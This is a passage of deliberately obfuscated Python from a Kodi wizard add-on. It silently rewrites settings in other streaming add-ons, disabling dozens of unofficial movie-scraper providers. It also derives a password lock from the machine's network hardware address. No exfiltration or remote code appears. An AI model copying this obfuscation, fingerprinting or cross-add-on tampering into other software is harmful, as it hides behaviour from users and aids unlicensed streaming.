    except :#line:1198
       pass #line:1199
def rdbuild ():#line:1209
	OO0O0O0000O0OO000 =(ADDON .getSetting ("rdbuild"))#line:1210
	if OO0O0O0000O0OO000 =='true':#line:1211
		OO000OOO0OOOO0OOO =xbmcaddon .Addon ('plugin.video.allmoviesin')#line:1212
		OO000OOO0OOOO0OOO .setSetting ('all_t','0')#line:1213
		OO000OOO0OOOO0OOO .setSetting ('rd_menu_enable','false')#line:1214
		OO000OOO0OOOO0OOO .setSetting ('magnet_bay','false')#line:1215
		OO000OOO0OOOO0OOO .setSetting ('magnet_extra','false')#line:1216
		OO000OOO0OOOO0OOO .setSetting ('rd_only','false')#line:1217
		OO000OOO0OOOO0OOO .setSetting ('ftp','false')#line:1219
		OO000OOO0OOOO0OOO .setSetting ('fp','false')#line:1220
		OO000OOO0OOOO0OOO .setSetting ('filter_fp','false')#line:1221
		OO000OOO0OOOO0OOO .setSetting ('fp_size_en','false')#line:1222
		OO000OOO0OOOO0OOO .setSetting ('afdah','false')#line:1223
		OO000OOO0OOOO0OOO .setSetting ('ap2s','false')#line:1224
		OO000OOO0OOOO0OOO .setSetting ('cin','false')#line:1225
		OO000OOO0OOOO0OOO .setSetting ('clv','false')#line:1226
		OO000OOO0OOOO0OOO .setSetting ('cmv','false')#line:1227
		OO000OOO0OOOO0OOO .setSetting ('dl20','false')#line:1228
		OO000OOO0OOOO0OOO .setSetting ('esc','false')#line:1229
		OO000OOO0OOOO0OOO .setSetting ('extra','false')#line:1230
		OO000OOO0OOOO0OOO .setSetting ('film','false')#line:1231
		OO000OOO0OOOO0OOO .setSetting ('fre','false')#line:1232
		OO000OOO0OOOO0OOO .setSetting ('fxy','false')#line:1233
		OO000OOO0OOOO0OOO .setSetting ('genv','false')#line:1234
		OO000OOO0OOOO0OOO .setSetting ('getgo','false')#line:1235
		OO000OOO0OOOO0OOO .setSetting ('gold','false')#line:1236
		OO000OOO0OOOO0OOO .setSetting ('gona','false')#line:1237
		OO000OOO0OOOO0OOO .setSetting ('hdmm','false')#line:1238
		OO000OOO0OOOO0OOO .setSetting ('hdt','false')#line:1239
		OO000OOO0OOOO0OOO .setSetting ('icy','false')#line:1240
		OO000OOO0OOOO0OOO .setSetting ('ind','false')#line:1241
		OO000OOO0OOOO0OOO .setSetting ('iwi','false')#line:1242
		OO000OOO0OOOO0OOO .setSetting ('jen_free','false')#line:1243
		OO000OOO0OOOO0OOO .setSetting ('kiss','false')#line:1244
		OO000OOO0OOOO0OOO .setSetting ('lavin','false')#line:1245
		OO000OOO0OOOO0OOO .setSetting ('los','false')#line:1246
		OO000OOO0OOOO0OOO .setSetting ('m4u','false')#line:1247
		OO000OOO0OOOO0OOO .setSetting ('mesh','false')#line:1248
		OO000OOO0OOOO0OOO .setSetting ('mf','false')#line:1249
		OO000OOO0OOOO0OOO .setSetting ('mkvc','false')#line:1250
		OO000OOO0OOOO0OOO .setSetting ('mjy','false')#line:1251
		OO000OOO0OOOO0OOO .setSetting ('hdonline','false')#line:1252
		OO000OOO0OOOO0OOO .setSetting ('moviex','false')#line:1253
		OO000OOO0OOOO0OOO .setSetting ('mpr','false')#line:1254
		OO000OOO0OOOO0OOO .setSetting ('mvg','false')#line:1255
		OO000OOO0OOOO0OOO .setSetting ('mvl','false')#line:1256
		OO000OOO0OOOO0OOO .setSetting ('mvs','false')#line:1257
		OO000OOO0OOOO0OOO .setSetting ('myeg','false')#line:1258
		OO000OOO0OOOO0OOO .setSetting ('ninja','false')#line:1259
		OO000OOO0OOOO0OOO .setSetting ('odb','false')#line:1260
		OO000OOO0OOOO0OOO .setSetting ('ophd','false')#line:1261
		OO000OOO0OOOO0OOO .setSetting ('pks','false')#line:1262
		OO000OOO0OOOO0OOO .setSetting ('prf','false')#line:1263
		OO000OOO0OOOO0OOO .setSetting ('put18','false')#line:1264
		OO000OOO0OOOO0OOO .setSetting ('req','false')#line:1265
		OO000OOO0OOOO0OOO .setSetting ('rftv','false')#line:1266
		OO000OOO0OOOO0OOO .setSetting ('rltv','false')#line:1267
		OO000OOO0OOOO0OOO .setSetting ('sc','false')#line:1268
		OO000OOO0OOOO0OOO .setSetting ('seehd','false')#line:1269
		OO000OOO0OOOO0OOO .setSetting ('showbox','false')#line:1270
		OO000OOO0OOOO0OOO .setSetting ('shuid','false')#line:1271
		OO000OOO0OOOO0OOO .setSetting ('sil_gh','false')#line:1272
		OO000OOO0OOOO0OOO .setSetting ('spv','false')#line:1273
		OO000OOO0OOOO0OOO .setSetting ('subs','false')#line:1274
		OO000OOO0OOOO0OOO .setSetting ('tvs','false')#line:1275
		OO000OOO0OOOO0OOO .setSetting ('tw','false')#line:1276
		OO000OOO0OOOO0OOO .setSetting ('upto','false')#line:1277
		OO000OOO0OOOO0OOO .setSetting ('vel','false')#line:1278
		OO000OOO0OOOO0OOO .setSetting ('vex','false')#line:1279
		OO000OOO0OOOO0OOO .setSetting ('vidc','false')#line:1280
		OO000OOO0OOOO0OOO .setSetting ('w4hd','false')#line:1281
		OO000OOO0OOOO0OOO .setSetting ('wav','false')#line:1282
		OO000OOO0OOOO0OOO .setSetting ('wf','false')#line:1283
		OO000OOO0OOOO0OOO .setSetting ('wse','false')#line:1284
		OO000OOO0OOOO0OOO .setSetting ('wss','false')#line:1285
		OO000OOO0OOOO0OOO .setSetting ('wsse','false')#line:1286
		OO000OOO0OOOO0OOO =xbmcaddon .Addon ('plugin.video.speedmax')#line:1287
		OO000OOO0OOOO0OOO .setSetting ('debrid.only','true')#line:1288
		OO000OOO0OOOO0OOO .setSetting ('hosts.captcha','false')#line:1289
		OO000OOO0OOOO0OOO =xbmcaddon .Addon ('script.module.civitasscrapers')#line:1290
		OO000OOO0OOOO0OOO .setSetting ('provider.123moviehd','false')#line:1291
		OO000OOO0OOOO0OOO .setSetting ('provider.300mbdownload','false')#line:1292
		OO000OOO0OOOO0OOO .setSetting ('provider.alltube','false')#line:1293
		OO000OOO0OOOO0OOO .setSetting ('provider.allucde','false')#line:1294
		OO000OOO0OOOO0OOO .setSetting ('provider.animebase','false')#line:1295
		OO000OOO0OOOO0OOO .setSetting ('provider.animeloads','false')#line:1296
		OO000OOO0OOOO0OOO .setSetting ('provider.animetoon','false')#line:1297
		OO000OOO0OOOO0OOO .setSetting ('provider.bnwmovies','false')#line:1298
		OO000OOO0OOOO0OOO .setSetting ('provider.boxfilm','false')#line:1299
		OO000OOO0OOOO0OOO .setSetting ('provider.bs','false')#line:1300
		OO000OOO0OOOO0OOO .setSetting ('provider.cartoonhd','false')#line:1301
		OO000OOO0OOOO0OOO .setSetting ('provider.cdahd','false')#line:1302
		OO000OOO0OOOO0OOO .setSetting ('provider.cdax','false')#line:1303
		OO000OOO0OOOO0OOO .setSetting ('provider.cine','false')#line:1304
		OO000OOO0OOOO0OOO .setSetting ('provider.cinenator','false')#line:1305
		OO000OOO0OOOO0OOO .setSetting ('provider.cmovieshdbz','false')#line:1306
		OO000OOO0OOOO0OOO .setSetting ('provider.coolmoviezone','false')#line:1307
		OO000OOO0OOOO0OOO .setSetting ('provider.ddl','false')#line:1308
		OO000OOO0OOOO0OOO .setSetting ('provider.deepmovie','false')#line:1309
		OO000OOO0OOOO0OOO .setSetting ('provider.ekinomaniak','false')#line:1310
		OO000OOO0OOOO0OOO .setSetting ('provider.ekinotv','false')#line:1311
		OO000OOO0OOOO0OOO .setSetting ('provider.filiser','false')#line:1312
		OO000OOO0OOOO0OOO .setSetting ('provider.filmpalast','false')#line:1313
		OO000OOO0OOOO0OOO .setSetting ('provider.filmwebbooster','false')#line:1314
		OO000OOO0OOOO0OOO .setSetting ('provider.filmxy','false')#line:1315
		OO000OOO0OOOO0OOO .setSetting ('provider.fmovies','false')#line:1316
		OO000OOO0OOOO0OOO .setSetting ('provider.foxx','false')#line:1317
		OO000OOO0OOOO0OOO .setSetting ('provider.freefmovies','false')#line:1318
		OO000OOO0OOOO0OOO .setSetting ('provider.freeputlocker','false')#line:1319
		OO000OOO0OOOO0OOO .setSetting ('provider.furk','false')#line:1320
		OO000OOO0OOOO0OOO .setSetting ('provider.gamatotv','false')#line:1321
		OO000OOO0OOOO0OOO .setSetting ('provider.gogoanime','false')#line:1322
		OO000OOO0OOOO0OOO .setSetting ('provider.gowatchseries','false')#line:1323
		OO000OOO0OOOO0OOO .setSetting ('provider.hackimdb','false')#line:1324
		OO000OOO0OOOO0OOO .setSetting ('provider.hdfilme','false')#line:1325
		OO000OOO0OOOO0OOO .setSetting ('provider.hdmto','false')#line:1326
		OO000OOO0OOOO0OOO .setSetting ('provider.hdpopcorns','false')#line:1327
		OO000OOO0OOOO0OOO .setSetting ('provider.hdstreams','false')#line:1328
		OO000OOO0OOOO0OOO .setSetting ('provider.horrorkino','false')#line:1330
		OO000OOO0OOOO0OOO .setSetting ('provider.iitv','false')#line:1331
		OO000OOO0OOOO0OOO .setSetting ('provider.iload','false')#line:1332
		OO000OOO0OOOO0OOO .setSetting ('provider.iwaatch','false')#line:1333
		OO000OOO0OOOO0OOO .setSetting ('provider.kinodogs','false')#line:1334
		OO000OOO0OOOO0OOO .setSetting ('provider.kinoking','false')#line:1335
		OO000OOO0OOOO0OOO .setSetting ('provider.kinow','false')#line:1336
		OO000OOO0OOOO0OOO .setSetting ('provider.kinox','false')#line:1337
		OO000OOO0OOOO0OOO .setSetting ('provider.lichtspielhaus','false')#line:1338
		OO000OOO0OOOO0OOO .setSetting ('provider.liomenoi','false')#line:1339
		OO000OOO0OOOO0OOO .setSetting ('provider.magnetdl','false')#line:1342
		OO000OOO0OOOO0OOO .setSetting ('provider.megapelistv','false')#line:1343
		OO000OOO0OOOO0OOO .setSetting ('provider.movie2k-ac','false')#line:1344
		OO000OOO0OOOO0OOO .setSetting ('provider.movie2k-ag','false')#line:1345
		OO000OOO0OOOO0OOO .setSetting ('provider.movie2z','false')#line:1346
		OO000OOO0OOOO0OOO .setSetting ('provider.movie4k','false')#line:1347
		OO000OOO0OOOO0OOO .setSetting ('provider.movie4kis','false')#line:1348
		OO000OOO0OOOO0OOO .setSetting ('provider.movieneo','false')#line:1349
		OO000OOO0OOOO0OOO .setSetting ('provider.moviesever','false')#line:1350
		OO000OOO0OOOO0OOO .setSetting ('provider.movietown','false')#line:1351
		OO000OOO0OOOO0OOO .setSetting ('provider.mvrls','false')#line:1353
		OO000OOO0OOOO0OOO .setSetting ('provider.netzkino','false')#line:1354
		OO000OOO0OOOO0OOO .setSetting ('provider.odb','false')#line:1355
		OO000OOO0OOOO0OOO .setSetting ('provider.openkatalog','false')#line:1356
		OO000OOO0OOOO0OOO .setSetting ('provider.ororo','false')#line:1357
		OO000OOO0OOOO0OOO .setSetting ('provider.paczamy','false')#line:1358
		OO000OOO0OOOO0OOO .setSetting ('provider.peliculasdk','false')#line:1359
		OO000OOO0OOOO0OOO .setSetting ('provider.pelisplustv','false')#line:1360
		OO000OOO0OOOO0OOO .setSetting ('provider.pepecine','false')#line:1361
		OO000OOO0OOOO0OOO .setSetting ('provider.primewire','false')#line:1362
		OO000OOO0OOOO0OOO .setSetting ('provider.projectfreetv','false')#line:1363
		OO000OOO0OOOO0OOO .setSetting ('provider.proxer','false')#line:1364
		OO000OOO0OOOO0OOO .setSetting ('provider.pureanime','false')#line:1365
		OO000OOO0OOOO0OOO .setSetting ('provider.putlocker','false')#line:1366
		OO000OOO0OOOO0OOO .setSetting ('provider.putlockerfree','false')#line:1367
		OO000OOO0OOOO0OOO .setSetting ('provider.reddit','false')#line:1368
		OO000OOO0OOOO0OOO .setSetting ('provider.cartoonwire','false')#line:1369
		OO000OOO0OOOO0OOO .setSetting ('provider.seehd','false')#line:1370
		OO000OOO0OOOO0OOO .setSetting ('provider.segos','false')#line:1371
		OO000OOO0OOOO0OOO .setSetting ('provider.serienstream','false')#line:1372
		OO000OOO0OOOO0OOO .setSetting ('provider.series9','false')#line:1373
		OO000OOO0OOOO0OOO .setSetting ('provider.seriesever','false')#line:1374
		OO000OOO0OOOO0OOO .setSetting ('provider.seriesonline','false')#line:1375
		OO000OOO0OOOO0OOO .setSetting ('provider.seriespapaya','false')#line:1376
		OO000OOO0OOOO0OOO .setSetting ('provider.sezonlukdizi','false')#line:1377
		OO000OOO0OOOO0OOO .setSetting ('provider.solarmovie','false')#line:1378
		OO000OOO0OOOO0OOO .setSetting ('provider.solarmoviez','false')#line:1379
		OO000OOO0OOOO0OOO .setSetting ('provider.stream-to','false')#line:1380
		OO000OOO0OOOO0OOO .setSetting ('provider.streamdream','false')#line:1381
		OO000OOO0OOOO0OOO .setSetting ('provider.streamflix','false')#line:1382
		OO000OOO0OOOO0OOO .setSetting ('provider.streamit','false')#line:1383
		OO000OOO0OOOO0OOO .setSetting ('provider.swatchseries','false')#line:1384
		OO000OOO0OOOO0OOO .setSetting ('provider.szukajkatv','false')#line:1385
		OO000OOO0OOOO0OOO .setSetting ('provider.tainiesonline','false')#line:1386
		OO000OOO0OOOO0OOO .setSetting ('provider.tainiomania','false')#line:1387
		OO000OOO0OOOO0OOO .setSetting ('provider.tata','false')#line:1390
		OO000OOO0OOOO0OOO .setSetting ('provider.trt','false')#line:1391
		OO000OOO0OOOO0OOO .setSetting ('provider.tvbox','false')#line:1392
		OO000OOO0OOOO0OOO .setSetting ('provider.ultrahd','false')#line:1393
		OO000OOO0OOOO0OOO .setSetting ('provider.video4k','false')#line:1394
		OO000OOO0OOOO0OOO .setSetting ('provider.vidics','false')#line:1395
		OO000OOO0OOOO0OOO .setSetting ('provider.view4u','false')#line:1396
		OO000OOO0OOOO0OOO .setSetting ('provider.watchseries','false')#line:1397
		OO000OOO0OOOO0OOO .setSetting ('provider.xrysoi','false')#line:1398
		OO000OOO0OOOO0OOO .setSetting ('provider.library','false')#line:1399
def fixfont ():#line:1402
	O00O0O00000O000O0 =xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.GetSettings","id":1}')#line:1403
	O0OOO00OOO000O000 =json .loads (O00O0O00000O000O0 );#line:1405
	O000OOOOO0O0OOO0O =O0OOO00OOO000O000 ["result"]["settings"]#line:1406
	O0O00OO00000OO00O =[O0O0O00O00O00OO00 for O0O0O00O00O00OO00 in O000OOOOO0O0OOO0O if O0O0O00O00O00OO00 ["id"]=="audiooutput.audiodevice"][0 ]#line:1408
	O00O0O00OO00OOOO0 =O0O00OO00000OO00O ["options"];#line:1409
	O0OOOO00OO00000OO =O0O00OO00000OO00O ["value"];#line:1410
	OO0OO00OO000OOO00 =[OO000O00000OOO00O for (OO000O00000OOO00O ,O0OOO0000O0OO0OO0 )in enumerate (O00O0O00OO00OOOO0 )if O0OOO0000O0OO0OO0 ["value"]==O0OOOO00OO00000OO ][0 ];#line:1412
	OOO0OOOOOOOOO000O =(OO0OO00OO000OOO00 +1 )%len (O00O0O00OO00OOOO0 )#line:1414
	OOO000O0O0O0OO0O0 =O00O0O00OO00OOOO0 [OOO0OOOOOOOOO000O ]["value"]#line:1416
	O0O00OOO0O0OOO00O =O00O0O00OO00OOOO0 [OOO0OOOOOOOOO000O ]["label"]#line:1417
	O00000O0OOOO0O000 =xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","params":{"setting":"subtitles.height","value":40},"id":1}')#line:1419
	try :#line:1421
		O0OO000OOO0OO0O0O =json .loads (O00000O0OOOO0O000 );#line:1422
		if O0OO000OOO0OO0O0O ["result"]!=True :#line:1424
			raise Exception #line:1425
	except :#line:1426
		sys .stderr .write ("Error switching audio output device")#line:1427
		raise Exception #line:1428
def parseDOM2 (OO00O00OOO0OO0OOO ,name =u"",attrs ={},ret =False ):#line:1429
	if isinstance (OO00O00OOO0OO0OOO ,str ):#line:1432
		try :#line:1433
			OO00O00OOO0OO0OOO =[OO00O00OOO0OO0OOO .decode ("utf-8")]#line:1434
		except :#line:1435
			OO00O00OOO0OO0OOO =[OO00O00OOO0OO0OOO ]#line:1436
	elif isinstance (OO00O00OOO0OO0OOO ,unicode ):#line:1437
		OO00O00OOO0OO0OOO =[OO00O00OOO0OO0OOO ]#line:1438
	elif not isinstance (OO00O00OOO0OO0OOO ,list ):#line:1439
		return u""#line:1440
	if not name .strip ():#line:1442
		return u""#line:1443
	OOO00000OOO00OOOO =[]#line:1445
	for OO0O00O0O00OOO0OO in OO00O00OOO0OO0OOO :#line:1446
		O00O00O00OO0OOO00 =re .compile ('(<[^>]*?\n[^>]*?>)').findall (OO0O00O0O00OOO0OO )#line:1447
		for OO000O000OOOO0OOO in O00O00O00OO0OOO00 :#line:1448
			OO0O00O0O00OOO0OO =OO0O00O0O00OOO0OO .replace (OO000O000OOOO0OOO ,OO000O000OOOO0OOO .replace ("\n"," "))#line:1449
		OO0O00OOO0OOOO000 =[]#line:1451
		for OO000OOO0O000O000 in attrs :#line:1452
			OOO00O00000OO0000 =re .compile ('(<'+name +'[^>]*?(?:'+OO000OOO0O000O000 +'=[\'"]'+attrs [OO000OOO0O000O000 ]+'[\'"].*?>))',re .M |re .S ).findall (OO0O00O0O00OOO0OO )#line:1453
			if len (OOO00O00000OO0000 )==0 and attrs [OO000OOO0O000O000 ].find (" ")==-1 :#line:1454
				OOO00O00000OO0000 =re .compile ('(<'+name +'[^>]*?(?:'+OO000OOO0O000O000 +'='+attrs [OO000OOO0O000O000 ]+'.*?>))',re .M |re .S ).findall (OO0O00O0O00OOO0OO )#line:1455
			if len (OO0O00OOO0OOOO000 )==0 :#line:1457
				OO0O00OOO0OOOO000 =OOO00O00000OO0000 #line:1458
				OOO00O00000OO0000 =[]#line:1459
			else :#line:1460
				O0OOO00OO00O0OO00 =range (len (OO0O00OOO0OOOO000 ))#line:1461
				O0OOO00OO00O0OO00 .reverse ()#line:1462
				for OOOO000OO000O00O0 in O0OOO00OO00O0OO00 :#line:1463
					if not OO0O00OOO0OOOO000 [OOOO000OO000O00O0 ]in OOO00O00000OO0000 :#line:1464
						del (OO0O00OOO0OOOO000 [OOOO000OO000O00O0 ])#line:1465
		if len (OO0O00OOO0OOOO000 )==0 and attrs =={}:#line:1467
			OO0O00OOO0OOOO000 =re .compile ('(<'+name +'>)',re .M |re .S ).findall (OO0O00O0O00OOO0OO )#line:1468
			if len (OO0O00OOO0OOOO000 )==0 :#line:1469
				OO0O00OOO0OOOO000 =re .compile ('(<'+name +' .*?>)',re .M |re .S ).findall (OO0O00O0O00OOO0OO )#line:1470
		if isinstance (ret ,str ):#line:1472
			OOO00O00000OO0000 =[]#line:1473
			for OO000O000OOOO0OOO in OO0O00OOO0OOOO000 :#line:1474
				OOOOO0OOOOO0OOO00 =re .compile ('<'+name +'.*?'+ret +'=([\'"].[^>]*?[\'"])>',re .M |re .S ).findall (OO000O000OOOO0OOO )#line:1475
				if len (OOOOO0OOOOO0OOO00 )==0 :#line:1476
					OOOOO0OOOOO0OOO00 =re .compile ('<'+name +'.*?'+ret +'=(.[^>]*?)>',re .M |re .S ).findall (OO000O000OOOO0OOO )#line:1477
				for O0O0OOO0000O00O0O in OOOOO0OOOOO0OOO00 :#line:1478
					OOO0OOOOOO0000OO0 =O0O0OOO0000O00O0O [0 ]#line:1479
					if OOO0OOOOOO0000OO0 in "'\"":#line:1480
						if O0O0OOO0000O00O0O .find ('='+OOO0OOOOOO0000OO0 ,O0O0OOO0000O00O0O .find (OOO0OOOOOO0000OO0 ,1 ))>-1 :#line:1481
							O0O0OOO0000O00O0O =O0O0OOO0000O00O0O [:O0O0OOO0000O00O0O .find ('='+OOO0OOOOOO0000OO0 ,O0O0OOO0000O00O0O .find (OOO0OOOOOO0000OO0 ,1 ))]#line:1482
						if O0O0OOO0000O00O0O .rfind (OOO0OOOOOO0000OO0 ,1 )>-1 :#line:1484
							O0O0OOO0000O00O0O =O0O0OOO0000O00O0O [1 :O0O0OOO0000O00O0O .rfind (OOO0OOOOOO0000OO0 )]#line:1485
					else :#line:1486
						if O0O0OOO0000O00O0O .find (" ")>0 :#line:1487
							O0O0OOO0000O00O0O =O0O0OOO0000O00O0O [:O0O0OOO0000O00O0O .find (" ")]#line:1488
						elif O0O0OOO0000O00O0O .find ("/")>0 :#line:1489
							O0O0OOO0000O00O0O =O0O0OOO0000O00O0O [:O0O0OOO0000O00O0O .find ("/")]#line:1490
						elif O0O0OOO0000O00O0O .find (">")>0 :#line:1491
							O0O0OOO0000O00O0O =O0O0OOO0000O00O0O [:O0O0OOO0000O00O0O .find (">")]#line:1492
					OOO00O00000OO0000 .append (O0O0OOO0000O00O0O .strip ())#line:1494
			OO0O00OOO0OOOO000 =OOO00O00000OO0000 #line:1495
		else :#line:1496
			OOO00O00000OO0000 =[]#line:1497
			for OO000O000OOOO0OOO in OO0O00OOO0OOOO000 :#line:1498
				O0O000OOOOO0000O0 =u"</"+name #line:1499
				OOOOOO0O0OOOOO0O0 =OO0O00O0O00OOO0OO .find (OO000O000OOOO0OOO )#line:1501
				O0O0O00OOOO00O0O0 =OO0O00O0O00OOO0OO .find (O0O000OOOOO0000O0 ,OOOOOO0O0OOOOO0O0 )#line:1502
				O00OO000O0OOOOO0O =OO0O00O0O00OOO0OO .find ("<"+name ,OOOOOO0O0OOOOO0O0 +1 )#line:1503
				while O00OO000O0OOOOO0O <O0O0O00OOOO00O0O0 and O00OO000O0OOOOO0O !=-1 :#line:1505
					OOO0O0O00O0OOO00O =OO0O00O0O00OOO0OO .find (O0O000OOOOO0000O0 ,O0O0O00OOOO00O0O0 +len (O0O000OOOOO0000O0 ))#line:1506
					if OOO0O0O00O0OOO00O !=-1 :#line:1507
						O0O0O00OOOO00O0O0 =OOO0O0O00O0OOO00O #line:1508
					O00OO000O0OOOOO0O =OO0O00O0O00OOO0OO .find ("<"+name ,O00OO000O0OOOOO0O +1 )#line:1509
				if OOOOOO0O0OOOOO0O0 ==-1 and O0O0O00OOOO00O0O0 ==-1 :#line:1511
					OO0O000O00OOOOO0O =u""#line:1512
				elif OOOOOO0O0OOOOO0O0 >-1 and O0O0O00OOOO00O0O0 >-1 :#line:1513
					OO0O000O00OOOOO0O =OO0O00O0O00OOO0OO [OOOOOO0O0OOOOO0O0 +len (OO000O000OOOO0OOO ):O0O0O00OOOO00O0O0 ]#line:1514
				elif O0O0O00OOOO00O0O0 >-1 :#line:1515
					OO0O000O00OOOOO0O =OO0O00O0O00OOO0OO [:O0O0O00OOOO00O0O0 ]#line:1516
				elif OOOOOO0O0OOOOO0O0 >-1 :#line:1517
					OO0O000O00OOOOO0O =OO0O00O0O00OOO0OO [OOOOOO0O0OOOOO0O0 +len (OO000O000OOOO0OOO ):]#line:1518
				if ret :#line:1520
					O0O000OOOOO0000O0 =OO0O00O0O00OOO0OO [O0O0O00OOOO00O0O0 :OO0O00O0O00OOO0OO .find (">",OO0O00O0O00OOO0OO .find (O0O000OOOOO0000O0 ))+1 ]#line:1521
					OO0O000O00OOOOO0O =OO000O000OOOO0OOO +OO0O000O00OOOOO0O +O0O000OOOOO0000O0 #line:1522
				OO0O00O0O00OOO0OO =OO0O00O0O00OOO0OO [OO0O00O0O00OOO0OO .find (OO0O000O00OOOOO0O ,OO0O00O0O00OOO0OO .find (OO000O000OOOO0OOO ))+len (OO0O000O00OOOOO0O ):]#line:1524
				OOO00O00000OO0000 .append (OO0O000O00OOOOO0O )#line:1525
			OO0O00OOO0OOOO000 =OOO00O00000OO0000 #line:1526
		OOO00000OOO00OOOO +=OO0O00OOO0OOOO000 #line:1527
	return OOO00000OOO00OOOO #line:1529
def addItem (OO00OO0OO00OO0O0O ,O00OO0OO000O00O00 ,OOOO0OO000OOO0O00 ,OOOOOOOO0OOO0O0O0 ,OOO000OOOOO0OO0O0 ,description =None ):#line:1531
	if description ==None :description =''#line:1532
	description ='[COLOR white]'+description +'[/COLOR]'#line:1533
	OO00OOOO0OOO00000 =sys .argv [0 ]+"?url="+urllib .quote_plus (O00OO0OO000O00O00 )+"&mode="+str (OOOO0OO000OOO0O00 )+"&name="+urllib .quote_plus (OO00OO0OO00OO0O0O )+"&iconimage="+urllib .quote_plus (OOOOOOOO0OOO0O0O0 )+"&fanart="+urllib .quote_plus (OOO000OOOOO0OO0O0 )#line:1534
	OOO00OO0OO000O0O0 =True #line:1535
	OO0OOO0O0O000000O =xbmcgui .ListItem (OO00OO0OO00OO0O0O ,iconImage =OOOOOOOO0OOO0O0O0 ,thumbnailImage =OOOOOOOO0OOO0O0O0 )#line:1536
	OO0OOO0O0O000000O .setInfo (type ="Video",infoLabels ={"Title":OO00OO0OO00OO0O0O ,"Plot":description })#line:1537
	OO0OOO0O0O000000O .setProperty ("fanart_Image",OOO000OOOOO0OO0O0 )#line:1538
	OO0OOO0O0O000000O .setProperty ("icon_Image",OOOOOOOO0OOO0O0O0 )#line:1539
	OOO00OO0OO000O0O0 =xbmcplugin .addDirectoryItem (handle =int (sys .argv [1 ]),url =OO00OOOO0OOO00000 ,listitem =OO0OOO0O0O000000O ,isFolder =False )#line:1540
	return OOO00OO0OO000O0O0 #line:1541
def get_params ():#line:1543
		O00O0O0OO00000O0O =[]#line:1544
		O0O00000O000OO0O0 =sys .argv [2 ]#line:1545
		if len (O0O00000O000OO0O0 )>=2 :#line:1546
				O0O00O0OOOO00OOO0 =sys .argv [2 ]#line:1547
				OO0OO0OOOOOO00OOO =O0O00O0OOOO00OOO0 .replace ('?','')#line:1548
				if (O0O00O0OOOO00OOO0 [len (O0O00O0OOOO00OOO0 )-1 ]=='/'):#line:1549
						O0O00O0OOOO00OOO0 =O0O00O0OOOO00OOO0 [0 :len (O0O00O0OOOO00OOO0 )-2 ]#line:1550
				O00OOOOO0OO0OOOOO =OO0OO0OOOOOO00OOO .split ('&')#line:1551
				O00O0O0OO00000O0O ={}#line:1552
				for O00O0OO0OO0OOO000 in range (len (O00OOOOO0OO0OOOOO )):#line:1553
						OOO000OOO0O0OO0OO ={}#line:1554
						OOO000OOO0O0OO0OO =O00OOOOO0OO0OOOOO [O00O0OO0OO0OOO000 ].split ('=')#line:1555
						if (len (OOO000OOO0O0OO0OO ))==2 :#line:1556
								O00O0O0OO00000O0O [OOO000OOO0O0OO0OO [0 ]]=OOO000OOO0O0OO0OO [1 ]#line:1557
		return O00O0O0OO00000O0O #line:1559
def decode (OO0OO0O00O0O0OOO0 ,O00O00OO00000000O ):#line:1564
    import base64 #line:1565
    OO000OOO0O0OOO0O0 =[]#line:1566
    if (len (OO0OO0O00O0O0OOO0 ))!=4 :#line:1568
     return 10 #line:1569
    O00O00OO00000000O =base64 .urlsafe_b64decode (O00O00OO00000000O )#line:1570
    for OOOOO0OOO000O00OO in range (len (O00O00OO00000000O )):#line:1572
        O0O0OOO00O000OOOO =OO0OO0O00O0O0OOO0 [OOOOO0OOO000O00OO %len (OO0OO0O00O0O0OOO0 )]#line:1573
        OO0O0O00O0O00000O =chr ((256 +ord (O00O00OO00000000O [OOOOO0OOO000O00OO ])-ord (O0O0OOO00O000OOOO ))%256 )#line:1574
        OO000OOO0O0OOO0O0 .append (OO0O0O00O0O00000O )#line:1575
    return "".join (OO000OOO0O0OOO0O0 )#line:1576
def tmdb_list (OO000O0O0OO00OO0O ):#line:1577
    OO0OO0O0000O00OO0 =decode ("7643",OO000O0O0OO00OO0O )#line:1580
    return int (OO0OO0O0000O00OO0 )#line:1583
def u_list (O0O0OO00OO000O000 ):#line:1584
   try :#line:1585
    from math import sqrt #line:1586
    O0000000000OOOO00 =tmdb_list (TMDB_NEW_API )#line:1587
    OOOOOOO00O00000O0 =str ((getHwAddr ('eth0'))*O0000000000OOOO00 )#line:1589
    O0OO0000O0O0OOO0O =int (OOOOOOO00O00000O0 [1 ]+OOOOOOO00O00000O0 [2 ]+OOOOOOO00O00000O0 [5 ]+OOOOOOO00O00000O0 [7 ])#line:1590
    O0O00O00OOOOOO000 =(ADDON .getSetting ("pass"))#line:1592
    OO0OO0OO0O0OO0O0O =(str (round (sqrt ((O0OO0000O0O0OOO0O *700 )+50 )+50 ,4 ))[-4 :]).replace ('.','')#line:1597
    if '.'in OO0OO0OO0O0OO0O0O :#line:1598
     OO0OO0OO0O0OO0O0O =(str (round (sqrt ((O0OO0000O0O0OOO0O *700 )+50 )+50 ,4 ))[-5 :]).replace ('.','')#line:1599
    if O0O00O00OOOOOO000 ==OO0OO0OO0O0OO0O0O :#line:1601
      O0OOOOO0O00O0OOOO =O0O0OO00OO000O000 #line:1603
    else :#line:1605
       if STARTP2 ()and STARTP ()=='ok':#line:1606
         return O0O0OO00OO000O000 #line:1609
       O0OOOOO0O00O0OOOO ='https://www.google.com/search?&q=don%27t+take+my+money&oq=dont+take+my+moniey'#line:1610
       xbmcgui .Dialog ().ok ('הקוד שלך',' סיסמה שגויה')#line:1611
       sys .exit ()#line:1612
    return O0OOOOO0O00O0OOOO #line:1613
   except :pass #line:1614
def disply_hwr ():#line:1616
   try :#line:1617
    OO0000OOO0OOOOOO0 =tmdb_list (TMDB_NEW_API )#line:1618
    O0OOO0OO00OOO0OO0 =str ((getHwAddr ('eth0'))*OO0000OOO0OOOOOO0 )#line:1619
    OO0000OOOO00000O0 =(O0OOO0OO00OOO0OO0 [1 ]+O0OOO0OO00OOO0OO0 [2 ]+O0OOO0OO00OOO0OO0 [5 ]+O0OOO0OO00OOO0OO0 [7 ])#line:1626
    O000OOO000OO000OO =(ADDON .getSetting ("action"))#line:1627
    wiz .setS ('action',str (OO0000OOOO00000O0 ))#line:1629
   except :pass #line:1630
def disply_hwr2 ():#line:1631
   try :#line:1632
    OO0O000O0O000000O =tmdb_list (TMDB_NEW_API )#line:1633
    O0O0000O00OOOOOO0 =str ((getHwAddr ('eth0'))*OO0O000O0O000000O )#line:1635
